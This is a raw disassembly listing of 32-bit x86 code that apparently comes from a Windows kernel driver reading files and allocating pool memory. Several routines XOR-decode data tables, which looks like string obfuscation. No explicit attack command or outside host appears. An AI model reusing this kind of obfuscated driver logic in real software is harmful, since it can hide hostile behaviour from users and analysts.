  401727:	50                   	push   %eax
  401728:	ff 15 cc 71 40 00    	call   *0x4071cc
  40172e:	ff d6                	call   *%esi
  401730:	85 c0                	test   %eax,%eax
  401732:	0f 88 80 fe ff ff    	js     0x4015b8
  401738:	a1 00 a8 40 00       	mov    0x40a800,%eax
  40173d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  401740:	8b 35 10 0d 41 00    	mov    0x410d10,%esi
  401746:	51                   	push   %ecx
  401747:	50                   	push   %eax
  401748:	a1 14 12 41 00       	mov    0x411214,%eax
  40174d:	8b ce                	mov    %esi,%ecx
  40174f:	50                   	push   %eax
  401750:	ff 15 cc 71 40 00    	call   *0x4071cc
  401756:	ff d6                	call   *%esi
  401758:	85 c0                	test   %eax,%eax
  40175a:	0f 88 58 fe ff ff    	js     0x4015b8
  401760:	a1 00 a8 40 00       	mov    0x40a800,%eax
  401765:	8b 35 3c 0c 41 00    	mov    0x410c3c,%esi
  40176b:	8b ce                	mov    %esi,%ecx
  40176d:	50                   	push   %eax
  40176e:	a1 14 12 41 00       	mov    0x411214,%eax
  401773:	50                   	push   %eax
  401774:	ff 15 cc 71 40 00    	call   *0x4071cc
  40177a:	ff d6                	call   *%esi
  40177c:	b0 01                	mov    $0x1,%al
  40177e:	5e                   	pop    %esi
  40177f:	8b e5                	mov    %ebp,%esp
  401781:	5d                   	pop    %ebp
  401782:	c3                   	ret
  401783:	cc                   	int3
  401784:	cc                   	int3
  401785:	cc                   	int3
  401786:	cc                   	int3
  401787:	cc                   	int3
  401788:	cc                   	int3
  401789:	cc                   	int3
  40178a:	cc                   	int3
  40178b:	cc                   	int3
  40178c:	cc                   	int3
  40178d:	cc                   	int3
  40178e:	cc                   	int3
  40178f:	cc                   	int3
  401790:	55                   	push   %ebp
  401791:	8b ec                	mov    %esp,%ebp
  401793:	a1 14 12 41 00       	mov    0x411214,%eax
  401798:	56                   	push   %esi
  401799:	8b 35 ec 0f 41 00    	mov    0x410fec,%esi
  40179f:	8b ce                	mov    %esi,%ecx
  4017a1:	68 01 00 00 c0       	push   $0xc0000001
  4017a6:	ff 75 0c             	push   0xc(%ebp)
  4017a9:	50                   	push   %eax
  4017aa:	ff 15 cc 71 40 00    	call   *0x4071cc
  4017b0:	ff d6                	call   *%esi
  4017b2:	5e                   	pop    %esi
  4017b3:	5d                   	pop    %ebp
  4017b4:	c2 14 00             	ret    $0x14
  4017b7:	cc                   	int3
  4017b8:	cc                   	int3
  4017b9:	cc                   	int3
  4017ba:	cc                   	int3
  4017bb:	cc                   	int3
  4017bc:	cc                   	int3
  4017bd:	cc                   	int3
  4017be:	cc                   	int3
  4017bf:	cc                   	int3
  4017c0:	80 3d f0 a7 40 00 00 	cmpb   $0x0,0x40a7f0
  4017c7:	75 03                	jne    0x4017cc
  4017c9:	33 c0                	xor    %eax,%eax
  4017cb:	c3                   	ret
  4017cc:	a1 00 a8 40 00       	mov    0x40a800,%eax
  4017d1:	56                   	push   %esi
  4017d2:	8b 35 4c 0c 41 00    	mov    0x410c4c,%esi
  4017d8:	8b ce                	mov    %esi,%ecx
  4017da:	50                   	push   %eax
  4017db:	a1 14 12 41 00       	mov    0x411214,%eax
  4017e0:	50                   	push   %eax
  4017e1:	ff 15 cc 71 40 00    	call   *0x4071cc
  4017e7:	ff d6                	call   *%esi
  4017e9:	5e                   	pop    %esi
  4017ea:	c3                   	ret
  4017eb:	cc                   	int3
  4017ec:	cc                   	int3
  4017ed:	cc                   	int3
  4017ee:	cc                   	int3
  4017ef:	cc                   	int3
  4017f0:	c2 04 00             	ret    $0x4
  4017f3:	cc                   	int3
  4017f4:	cc                   	int3
  4017f5:	cc                   	int3
  4017f6:	cc                   	int3
  4017f7:	cc                   	int3
  4017f8:	cc                   	int3
  4017f9:	cc                   	int3
  4017fa:	cc                   	int3
  4017fb:	cc                   	int3
  4017fc:	cc                   	int3
  4017fd:	cc                   	int3
  4017fe:	cc                   	int3
  4017ff:	cc                   	int3
  401800:	55                   	push   %ebp
  401801:	8b ec                	mov    %esp,%ebp
  401803:	a1 14 12 41 00       	mov    0x411214,%eax
  401808:	56                   	push   %esi
  401809:	8b 35 ec 0f 41 00    	mov    0x410fec,%esi
  40180f:	8b ce                	mov    %esi,%ecx
  401811:	6a 00                	push   $0x0
  401813:	ff 75 0c             	push   0xc(%ebp)
  401816:	50                   	push   %eax
  401817:	ff 15 cc 71 40 00    	call   *0x4071cc
  40181d:	ff d6                	call   *%esi
  40181f:	5e                   	pop    %esi
  401820:	5d                   	pop    %ebp
  401821:	c2 0c 00             	ret    $0xc
  401824:	cc                   	int3
  401825:	cc                   	int3
  401826:	cc                   	int3
  401827:	cc                   	int3
  401828:	cc                   	int3
  401829:	cc                   	int3
  40182a:	cc                   	int3
  40182b:	cc                   	int3
  40182c:	cc                   	int3
  40182d:	cc                   	int3
  40182e:	cc                   	int3
  40182f:	cc                   	int3
  401830:	55                   	push   %ebp
  401831:	8b ec                	mov    %esp,%ebp
  401833:	83 ec 08             	sub    $0x8,%esp
  401836:	53                   	push   %ebx
  401837:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40183a:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  401841:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  401845:	57                   	push   %edi
  401846:	85 db                	test   %ebx,%ebx
  401848:	0f 84 99 00 00 00    	je     0x4018e7
  40184e:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401851:	85 ff                	test   %edi,%edi
  401853:	0f 84 8e 00 00 00    	je     0x4018e7
  401859:	a1 fc a7 40 00       	mov    0x40a7fc,%eax
  40185e:	56                   	push   %esi
  40185f:	8b 35 a4 0d 41 00    	mov    0x410da4,%esi
  401865:	8b ce                	mov    %esi,%ecx
  401867:	50                   	push   %eax
  401868:	a1 14 12 41 00       	mov    0x411214,%eax
  40186d:	50                   	push   %eax
  40186e:	ff 15 cc 71 40 00    	call   *0x4071cc
  401874:	ff d6                	call   *%esi
  401876:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  401879:	51                   	push   %ecx
  40187a:	68 06 6d 40 00       	push   $0x406d06
  40187f:	50                   	push   %eax
  401880:	e8 ab 32 00 00       	call   0x404b30
  401885:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401888:	5e                   	pop    %esi
  401889:	85 c0                	test   %eax,%eax
  40188b:	78 40                	js     0x4018cd
  40188d:	8d 41 0c             	lea    0xc(%ecx),%eax
  401890:	85 c0                	test   %eax,%eax
  401892:	74 39                	je     0x4018cd
  401894:	8b 41 08             	mov    0x8(%ecx),%eax
  401897:	85 c0                	test   %eax,%eax
  401899:	74 32                	je     0x4018cd
  40189b:	3b f8                	cmp    %eax,%edi
  40189d:	76 2e                	jbe    0x4018cd
  40189f:	57                   	push   %edi
  4018a0:	6a 00                	push   $0x0
  4018a2:	53                   	push   %ebx
  4018a3:	e8 28 50 00 00       	call   0x4068d0
  4018a8:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4018ab:	83 c4 0c             	add    $0xc,%esp
  4018ae:	8b 41 08             	mov    0x8(%ecx),%eax
  4018b1:	83 c1 0c             	add    $0xc,%ecx
  4018b4:	3b f8                	cmp    %eax,%edi
  4018b6:	77 03                	ja     0x4018bb
  4018b8:	8d 47 ff             	lea    -0x1(%edi),%eax
  4018bb:	50                   	push   %eax
  4018bc:	51                   	push   %ecx
  4018bd:	53                   	push   %ebx
  4018be:	e8 07 50 00 00       	call   0x4068ca
  4018c3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4018c6:	83 c4 0c             	add    $0xc,%esp
  4018c9:	b3 01                	mov    $0x1,%bl
  4018cb:	eb 03                	jmp    0x4018d0
  4018cd:	8a 5d ff             	mov    -0x1(%ebp),%bl
  4018d0:	85 c9                	test   %ecx,%ecx
  4018d2:	74 09                	je     0x4018dd
  4018d4:	6a 00                	push   $0x0
  4018d6:	51                   	push   %ecx
  4018d7:	ff 15 ac 71 40 00    	call   *0x4071ac
  4018dd:	5f                   	pop    %edi
  4018de:	8a c3                	mov    %bl,%al
  4018e0:	5b                   	pop    %ebx
  4018e1:	8b e5                	mov    %ebp,%esp
  4018e3:	5d                   	pop    %ebp
  4018e4:	c2 08 00             	ret    $0x8
  4018e7:	5f                   	pop    %edi
  4018e8:	32 c0                	xor    %al,%al
  4018ea:	5b                   	pop    %ebx
  4018eb:	8b e5                	mov    %ebp,%esp
  4018ed:	5d                   	pop    %ebp
  4018ee:	c2 08 00             	ret    $0x8
  4018f1:	cc                   	int3
  4018f2:	cc                   	int3
  4018f3:	cc                   	int3
  4018f4:	cc                   	int3
  4018f5:	cc                   	int3
  4018f6:	cc                   	int3
  4018f7:	cc                   	int3
  4018f8:	cc                   	int3
  4018f9:	cc                   	int3
  4018fa:	cc                   	int3
  4018fb:	cc                   	int3
  4018fc:	cc                   	int3
  4018fd:	cc                   	int3
  4018fe:	cc                   	int3
  4018ff:	cc                   	int3
  401900:	55                   	push   %ebp
  401901:	8b ec                	mov    %esp,%ebp
  401903:	8b 45 08             	mov    0x8(%ebp),%eax
  401906:	a3 f4 a7 40 00       	mov    %eax,0x40a7f4
  40190b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40190e:	a3 f8 a7 40 00       	mov    %eax,0x40a7f8
  401913:	5d                   	pop    %ebp
  401914:	c2 08 00             	ret    $0x8
  401917:	cc                   	int3
  401918:	cc                   	int3
  401919:	cc                   	int3
  40191a:	cc                   	int3
  40191b:	cc                   	int3
  40191c:	cc                   	int3
  40191d:	cc                   	int3
  40191e:	cc                   	int3
  40191f:	cc                   	int3
  401920:	68 08 a7 40 00       	push   $0x40a708
  401925:	6a 7f                	push   $0x7f
  401927:	68 08 80 40 00       	push   $0x408008
  40192c:	e8 af 01 00 00       	call   0x401ae0
  401931:	68 08 a7 40 00       	push   $0x40a708
  401936:	6a 7f                	push   $0x7f
  401938:	68 88 80 40 00       	push   $0x408088
  40193d:	e8 9e 01 00 00       	call   0x401ae0
  401942:	68 08 a7 40 00       	push   $0x40a708
  401947:	6a 7f                	push   $0x7f
  401949:	68 08 81 40 00       	push   $0x408108
  40194e:	e8 8d 01 00 00       	call   0x401ae0
  401953:	68 08 a7 40 00       	push   $0x40a708
  401958:	6a 7f                	push   $0x7f
  40195a:	68 88 81 40 00       	push   $0x408188
  40195f:	e8 7c 01 00 00       	call   0x401ae0
  401964:	68 08 a7 40 00       	push   $0x40a708
  401969:	68 9d 00 00 00       	push   $0x9d
  40196e:	68 08 82 40 00       	push   $0x408208
  401973:	e8 68 01 00 00       	call   0x401ae0
  401978:	68 08 a7 40 00       	push   $0x40a708
  40197d:	6a 4a                	push   $0x4a
  40197f:	68 a8 82 40 00       	push   $0x4082a8
  401984:	e8 57 01 00 00       	call   0x401ae0
  401989:	68 08 a7 40 00       	push   $0x40a708
  40198e:	6a 0c                	push   $0xc
  401990:	68 f4 82 40 00       	push   $0x4082f4
  401995:	e8 46 01 00 00       	call   0x401ae0
  40199a:	c3                   	ret
  40199b:	cc                   	int3
  40199c:	cc                   	int3
  40199d:	cc                   	int3
  40199e:	cc                   	int3
  40199f:	cc                   	int3
  4019a0:	55                   	push   %ebp
  4019a1:	8b ec                	mov    %esp,%ebp
  4019a3:	83 ec 08             	sub    $0x8,%esp
  4019a6:	53                   	push   %ebx
  4019a7:	b9 0c 83 40 00       	mov    $0x40830c,%ecx
  4019ac:	56                   	push   %esi
  4019ad:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4019b0:	57                   	push   %edi
  4019b1:	33 ff                	xor    %edi,%edi
  4019b3:	0f b7 71 fc          	movzwl -0x4(%ecx),%esi
  4019b7:	66 85 f6             	test   %si,%si
  4019ba:	0f 84 f4 00 00 00    	je     0x401ab4
  4019c0:	b8 25 49 92 24       	mov    $0x24924925,%eax
  4019c5:	f7 e7                	mul    %edi
  4019c7:	8b c7                	mov    %edi,%eax
  4019c9:	2b c2                	sub    %edx,%eax
  4019cb:	d1 e8                	shr    $1,%eax
  4019cd:	03 c2                	add    %edx,%eax
  4019cf:	c1 e8 02             	shr    $0x2,%eax
  4019d2:	8d 14 c5 00 00 00 00 	lea    0x0(,%eax,8),%edx
  4019d9:	2b d0                	sub    %eax,%edx
  4019db:	8b c7                	mov    %edi,%eax
  4019dd:	2b c2                	sub    %edx,%eax
  4019df:	66 8b 04 85 08 a7 40 	mov    0x40a708(,%eax,4),%ax
  4019e6:	00 
  4019e7:	66 33 c6             	xor    %si,%ax
  4019ea:	66 89 41 fc          	mov    %ax,-0x4(%ecx)
  4019ee:	0f b7 41 fe          	movzwl -0x2(%ecx),%eax
  4019f2:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4019f5:	66 85 c0             	test   %ax,%ax
  4019f8:	0f 84 b6 00 00 00    	je     0x401ab4
  4019fe:	8d 5f 02             	lea    0x2(%edi),%ebx
  401a01:	b8 25 49 92 24       	mov    $0x24924925,%eax
  401a06:	8d 73 ff             	lea    -0x1(%ebx),%esi
  401a09:	f7 e6                	mul    %esi
  401a0b:	8b c7                	mov    %edi,%eax
  401a0d:	2b f2                	sub    %edx,%esi
  401a0f:	d1 ee                	shr    $1,%esi
  401a11:	03 f2                	add    %edx,%esi
  401a13:	c1 ee 02             	shr    $0x2,%esi
  401a16:	8d 14 f5 00 00 00 00 	lea    0x0(,%esi,8),%edx
  401a1d:	2b d6                	sub    %esi,%edx
  401a1f:	0f b7 31             	movzwl (%ecx),%esi
  401a22:	2b c2                	sub    %edx,%eax
  401a24:	66 8b 04 85 0c a7 40 	mov    0x40a70c(,%eax,4),%ax
  401a2b:	00 
  401a2c:	66 33 45 f8          	xor    -0x8(%ebp),%ax
  401a30:	66 89 41 fe          	mov    %ax,-0x2(%ecx)
  401a34:	66 85 f6             	test   %si,%si
  401a37:	74 7b                	je     0x401ab4
  401a39:	b8 25 49 92 24       	mov    $0x24924925,%eax
  401a3e:	f7 e3                	mul    %ebx
  401a40:	8b c3                	mov    %ebx,%eax
  401a42:	2b c2                	sub    %edx,%eax
  401a44:	d1 e8                	shr    $1,%eax
  401a46:	03 c2                	add    %edx,%eax
  401a48:	c1 e8 02             	shr    $0x2,%eax
  401a4b:	8d 14 c5 00 00 00 00 	lea    0x0(,%eax,8),%edx
  401a52:	2b d0                	sub    %eax,%edx
  401a54:	8b c7                	mov    %edi,%eax
  401a56:	2b c2                	sub    %edx,%eax
  401a58:	66 8b 04 85 10 a7 40 	mov    0x40a710(,%eax,4),%ax
  401a5f:	00 
  401a60:	66 33 c6             	xor    %si,%ax
  401a63:	66 89 01             	mov    %ax,(%ecx)
  401a66:	0f b7 41 02          	movzwl 0x2(%ecx),%eax
  401a6a:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401a6d:	66 85 c0             	test   %ax,%ax
  401a70:	74 42                	je     0x401ab4
  401a72:	8d 73 01             	lea    0x1(%ebx),%esi
  401a75:	b8 25 49 92 24       	mov    $0x24924925,%eax
  401a7a:	f7 e6                	mul    %esi
  401a7c:	8b c7                	mov    %edi,%eax
  401a7e:	83 c7 04             	add    $0x4,%edi
  401a81:	2b f2                	sub    %edx,%esi
  401a83:	d1 ee                	shr    $1,%esi
  401a85:	03 f2                	add    %edx,%esi
  401a87:	c1 ee 02             	shr    $0x2,%esi
  401a8a:	8d 14 f5 00 00 00 00 	lea    0x0(,%esi,8),%edx
  401a91:	2b d6                	sub    %esi,%edx
  401a93:	2b c2                	sub    %edx,%eax
  401a95:	66 8b 04 85 14 a7 40 	mov    0x40a714(,%eax,4),%ax
  401a9c:	00 
  401a9d:	66 33 45 f8          	xor    -0x8(%ebp),%ax
  401aa1:	66 89 41 02          	mov    %ax,0x2(%ecx)
  401aa5:	83 c1 08             	add    $0x8,%ecx
  401aa8:	81 ff 00 04 00 00    	cmp    $0x400,%edi
  401aae:	0f 8c ff fe ff ff    	jl     0x4019b3
  401ab4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401ab7:	81 c1 00 04 00 00    	add    $0x400,%ecx
  401abd:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  401ac0:	81 f9 0c a7 40 00    	cmp    $0x40a70c,%ecx
  401ac6:	0f 8c e5 fe ff ff    	jl     0x4019b1
  401acc:	5f                   	pop    %edi
  401acd:	5e                   	pop    %esi
  401ace:	5b                   	pop    %ebx
  401acf:	8b e5                	mov    %ebp,%esp
  401ad1:	5d                   	pop    %ebp
  401ad2:	c3                   	ret
  401ad3:	cc                   	int3
  401ad4:	cc                   	int3
  401ad5:	cc                   	int3
  401ad6:	cc                   	int3
  401ad7:	cc                   	int3
  401ad8:	cc                   	int3
  401ad9:	cc                   	int3
  401ada:	cc                   	int3
  401adb:	cc                   	int3
  401adc:	cc                   	int3
  401add:	cc                   	int3
  401ade:	cc                   	int3
  401adf:	cc                   	int3
  401ae0:	55                   	push   %ebp
  401ae1:	8b ec                	mov    %esp,%ebp
  401ae3:	57                   	push   %edi
  401ae4:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401ae7:	33 c9                	xor    %ecx,%ecx
  401ae9:	85 ff                	test   %edi,%edi
  401aeb:	7e 3d                	jle    0x401b2a
  401aed:	56                   	push   %esi
  401aee:	8b 75 08             	mov    0x8(%ebp),%esi
  401af1:	53                   	push   %ebx
  401af2:	8a 1c 31             	mov    (%ecx,%esi,1),%bl
  401af5:	84 db                	test   %bl,%bl
  401af7:	74 2f                	je     0x401b28
  401af9:	b8 25 49 92 24       	mov    $0x24924925,%eax
  401afe:	f7 e1                	mul    %ecx
  401b00:	8b c1                	mov    %ecx,%eax
  401b02:	2b c2                	sub    %edx,%eax
  401b04:	d1 e8                	shr    $1,%eax
  401b06:	03 c2                	add    %edx,%eax
  401b08:	c1 e8 02             	shr    $0x2,%eax
  401b0b:	8d 14 c5 00 00 00 00 	lea    0x0(,%eax,8),%edx
  401b12:	2b d0                	sub    %eax,%edx
  401b14:	8b c1                	mov    %ecx,%eax
  401b16:	2b c2                	sub    %edx,%eax
  401b18:	8b 55 10             	mov    0x10(%ebp),%edx
  401b1b:	8a 04 82             	mov    (%edx,%eax,4),%al
  401b1e:	32 c3                	xor    %bl,%al
  401b20:	88 04 31             	mov    %al,(%ecx,%esi,1)
  401b23:	41                   	inc    %ecx
  401b24:	3b cf                	cmp    %edi,%ecx
  401b26:	7c ca                	jl     0x401af2
  401b28:	5b                   	pop    %ebx
  401b29:	5e                   	pop    %esi
  401b2a:	5f                   	pop    %edi
  401b2b:	5d                   	pop    %ebp
  401b2c:	c2 0c 00             	ret    $0xc
  401b2f:	cc                   	int3
  401b30:	55                   	push   %ebp
  401b31:	8b ec                	mov    %esp,%ebp
  401b33:	8b 45 08             	mov    0x8(%ebp),%eax
  401b36:	83 f8 04             	cmp    $0x4,%eax
  401b39:	75 09                	jne    0x401b44
  401b3b:	b8 08 82 40 00       	mov    $0x408208,%eax
  401b40:	5d                   	pop    %ebp
  401b41:	c2 04 00             	ret    $0x4
  401b44:	83 f8 05             	cmp    $0x5,%eax
  401b47:	75 09                	jne    0x401b52
  401b49:	b8 a8 82 40 00       	mov    $0x4082a8,%eax
  401b4e:	5d                   	pop    %ebp
  401b4f:	c2 04 00             	ret    $0x4
  401b52:	83 f8 06             	cmp    $0x6,%eax
  401b55:	75 09                	jne    0x401b60
  401b57:	b8 f4 82 40 00       	mov    $0x4082f4,%eax
  401b5c:	5d                   	pop    %ebp
  401b5d:	c2 04 00             	ret    $0x4
  401b60:	c1 e0 07             	shl    $0x7,%eax
  401b63:	05 08 80 40 00       	add    $0x408008,%eax
  401b68:	5d                   	pop    %ebp
  401b69:	c2 04 00             	ret    $0x4
  401b6c:	cc                   	int3
  401b6d:	cc                   	int3
  401b6e:	cc                   	int3
  401b6f:	cc                   	int3
  401b70:	55                   	push   %ebp
  401b71:	8b ec                	mov    %esp,%ebp
  401b73:	8b 45 08             	mov    0x8(%ebp),%eax
  401b76:	c1 e0 0a             	shl    $0xa,%eax
  401b79:	05 08 83 40 00       	add    $0x408308,%eax
  401b7e:	5d                   	pop    %ebp
  401b7f:	c2 04 00             	ret    $0x4
  401b82:	cc                   	int3
  401b83:	cc                   	int3
  401b84:	cc                   	int3
  401b85:	cc                   	int3
  401b86:	cc                   	int3
  401b87:	cc                   	int3
  401b88:	cc                   	int3
  401b89:	cc                   	int3
  401b8a:	cc                   	int3
  401b8b:	cc                   	int3
  401b8c:	cc                   	int3
  401b8d:	cc                   	int3
  401b8e:	cc                   	int3
  401b8f:	cc                   	int3
  401b90:	55                   	push   %ebp
  401b91:	8b ec                	mov    %esp,%ebp
  401b93:	51                   	push   %ecx
  401b94:	56                   	push   %esi
  401b95:	6a 04                	push   $0x4
  401b97:	68 80 00 10 00       	push   $0x100080
  401b9c:	ff 75 08             	push   0x8(%ebp)
  401b9f:	e8 5c 00 00 00       	call   0x401c00
  401ba4:	8b f0                	mov    %eax,%esi
  401ba6:	85 f6                	test   %esi,%esi
  401ba8:	74 47                	je     0x401bf1
  401baa:	57                   	push   %edi
  401bab:	6a 00                	push   $0x0
  401bad:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401bb0:	50                   	push   %eax
  401bb1:	a1 a4 70 40 00       	mov    0x4070a4,%eax
  401bb6:	6a 00                	push   $0x0
  401bb8:	8b 00                	mov    (%eax),%eax
  401bba:	50                   	push   %eax
  401bbb:	68 00 00 01 00       	push   $0x10000
  401bc0:	56                   	push   %esi
  401bc1:	ff 15 88 70 40 00    	call   *0x407088
  401bc7:	8b f8                	mov    %eax,%edi
  401bc9:	85 ff                	test   %edi,%edi
  401bcb:	78 13                	js     0x401be0
  401bcd:	ff 75 fc             	push   -0x4(%ebp)
  401bd0:	e8 1b 02 00 00       	call   0x401df0
  401bd5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401bd8:	8b f8                	mov    %eax,%edi
  401bda:	ff 15 8c 70 40 00    	call   *0x40708c
  401be0:	56                   	push   %esi
  401be1:	ff 15 a0 70 40 00    	call   *0x4070a0
  401be7:	8b c7                	mov    %edi,%eax
  401be9:	5f                   	pop    %edi
  401bea:	5e                   	pop    %esi
  401beb:	8b e5                	mov    %ebp,%esp
  401bed:	5d                   	pop    %ebp
  401bee:	c2 04 00             	ret    $0x4
  401bf1:	b8 34 00 00 c0       	mov    $0xc0000034,%eax
  401bf6:	5e                   	pop    %esi
  401bf7:	8b e5                	mov    %ebp,%esp
  401bf9:	5d                   	pop    %ebp
  401bfa:	c2 04 00             	ret    $0x4
  401bfd:	cc                   	int3
  401bfe:	cc                   	int3
  401bff:	cc                   	int3
  401c00:	55                   	push   %ebp
  401c01:	8b ec                	mov    %esp,%ebp
  401c03:	83 ec 50             	sub    $0x50,%esp
  401c06:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  401c0b:	33 c5                	xor    %ebp,%eax
  401c0d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c10:	33 c9                	xor    %ecx,%ecx
  401c12:	8b 45 08             	mov    0x8(%ebp),%eax
  401c15:	68 00 01 00 00       	push   $0x100
  401c1a:	51                   	push   %ecx
  401c1b:	51                   	push   %ecx
  401c1c:	51                   	push   %ecx
  401c1d:	51                   	push   %ecx
  401c1e:	6a 20                	push   $0x20
  401c20:	6a 01                	push   $0x1
  401c22:	ff 75 10             	push   0x10(%ebp)
  401c25:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401c28:	8d 45 b0             	lea    -0x50(%ebp),%eax
  401c2b:	68 80 00 00 00       	push   $0x80
  401c30:	51                   	push   %ecx
  401c31:	50                   	push   %eax
  401c32:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401c35:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  401c3c:	50                   	push   %eax
  401c3d:	ff 75 0c             	push   0xc(%ebp)
  401c40:	8d 45 d0             	lea    -0x30(%ebp),%eax
  401c43:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  401c46:	50                   	push   %eax
  401c47:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  401c4a:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  401c4d:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401c50:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  401c53:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  401c56:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401c59:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401c5c:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401c5f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401c62:	c7 45 b8 18 00 00 00 	movl   $0x18,-0x48(%ebp)
  401c69:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  401c6c:	c7 45 c4 40 02 00 00 	movl   $0x240,-0x3c(%ebp)
  401c73:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  401c76:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  401c79:	ff 15 7c 70 40 00    	call   *0x40707c
  401c7f:	85 c0                	test   %eax,%eax
  401c81:	78 22                	js     0x401ca5
  401c83:	6a 04                	push   $0x4
  401c85:	6a 28                	push   $0x28
  401c87:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  401c8a:	50                   	push   %eax
  401c8b:	8d 45 b0             	lea    -0x50(%ebp),%eax
  401c8e:	50                   	push   %eax
  401c8f:	ff 75 d0             	push   -0x30(%ebp)
  401c92:	ff 15 90 70 40 00    	call   *0x407090
  401c98:	85 c0                	test   %eax,%eax
  401c9a:	79 1b                	jns    0x401cb7
  401c9c:	ff 75 d0             	push   -0x30(%ebp)
  401c9f:	ff 15 a0 70 40 00    	call   *0x4070a0
  401ca5:	33 c0                	xor    %eax,%eax
  401ca7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401caa:	33 cd                	xor    %ebp,%ecx
  401cac:	e8 c5 4f 00 00       	call   0x406c76
  401cb1:	8b e5                	mov    %ebp,%esp
  401cb3:	5d                   	pop    %ebp
  401cb4:	c2 0c 00             	ret    $0xc
  401cb7:	f6 45 f4 10          	testb  $0x10,-0xc(%ebp)
  401cbb:	75 df                	jne    0x401c9c
  401cbd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401cc0:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401cc3:	33 cd                	xor    %ebp,%ecx
  401cc5:	e8 ac 4f 00 00       	call   0x406c76
  401cca:	8b e5                	mov    %ebp,%esp
  401ccc:	5d                   	pop    %ebp
  401ccd:	c2 0c 00             	ret    $0xc
  401cd0:	55                   	push   %ebp
  401cd1:	8b ec                	mov    %esp,%ebp
  401cd3:	83 ec 28             	sub    $0x28,%esp
  401cd6:	a1 a4 a7 40 00       	mov    0x40a7a4,%eax
  401cdb:	33 c5                	xor    %ebp,%eax
  401cdd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401ce0:	8b 45 08             	mov    0x8(%ebp),%eax
  401ce3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401ce6:	53                   	push   %ebx
  401ce7:	8b 5d 10             	mov    0x10(%ebp),%ebx
  401cea:	56                   	push   %esi
  401ceb:	6a 04                	push   $0x4
  401ced:	68 80 00 10 00       	push   $0x100080
  401cf2:	50                   	push   %eax
  401cf3:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401cf6:	e8 05 ff ff ff       	call   0x401c00
  401cfb:	8b f0                	mov    %eax,%esi
  401cfd:	85 f6                	test   %esi,%esi
  401cff:	0f 84 8a 00 00 00    	je     0x401d8f
  401d05:	57                   	push   %edi
  401d06:	6a 05                	push   $0x5
  401d08:	6a 18                	push   $0x18
  401d0a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401d0d:	50                   	push   %eax
  401d0e:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401d11:	50                   	push   %eax
  401d12:	56                   	push   %esi
  401d13:	ff 15 90 70 40 00    	call   *0x407090
  401d19:	8b f8                	mov    %eax,%edi
  401d1b:	85 ff                	test   %edi,%edi
  401d1d:	78 54                	js     0x401d73
  401d1f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401d22:	68 51 61 78 58       	push   $0x58786151
  401d27:	50                   	push   %eax
  401d28:	6a 01                	push   $0x1
  401d2a:	89 03                	mov    %eax,(%ebx)
  401d2c:	ff 15 f4 70 40 00    	call   *0x4070f4
  401d32:	8b c8                	mov    %eax,%ecx
  401d34:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401d37:	89 08                	mov    %ecx,(%eax)
  401d39:	85 c9                	test   %ecx,%ecx
  401d3b:	74 36                	je     0x401d73
  401d3d:	8b 03                	mov    (%ebx),%eax
  401d3f:	6a 00                	push   $0x0
  401d41:	6a 00                	push   $0x0
  401d43:	50                   	push   %eax
  401d44:	51                   	push   %ecx
  401d45:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401d48:	50                   	push   %eax
  401d49:	6a 00                	push   $0x0
  401d4b:	6a 00                	push   $0x0
  401d4d:	6a 00                	push   $0x0
  401d4f:	56                   	push   %esi
  401d50:	ff 15 98 70 40 00    	call   *0x407098
  401d56:	8b f8                	mov    %eax,%edi
  401d58:	85 ff                	test   %edi,%edi
  401d5a:	79 17                	jns    0x401d73
  401d5c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401d5f:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  401d65:	68 51 61 78 58       	push   $0x58786151
  401d6a:	8b 00                	mov    (%eax),%eax
  401d6c:	50                   	push   %eax
  401d6d:	ff 15 ac 71 40 00    	call   *0x4071ac
  401d73:	56                   	push   %esi
  401d74:	ff 15 a0 70 40 00    	call   *0x4070a0
  401d7a:	8b c7                	mov    %edi,%eax
  401d7c:	5f                   	pop    %edi
  401d7d:	5e                   	pop    %esi
